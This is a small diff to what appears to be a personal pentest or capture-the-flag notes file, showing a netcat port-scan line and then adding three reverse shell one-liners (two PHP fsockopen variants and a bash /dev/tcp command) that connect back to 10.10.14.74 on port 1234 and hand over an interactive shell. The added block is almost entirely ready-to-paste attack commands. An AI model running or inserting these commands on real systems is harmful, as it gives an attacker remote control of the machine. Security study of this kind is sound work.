@@ -195,3 +195,10 @@ I have to write more about this
   * It can be used to scan for open ports `nc -z -v 10.10.8.8 20-80`.  
 
 
+```console
+php -r '$s=fsockopen("10.10.14.74",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");' 
+
+$s=fsockopen("10.10.14.74",1234);system("/bin/sh -i <&3 >&3 2>&3");
+
+bash -i >& /dev/tcp/10.10.14.74/1234 0>&1
+```
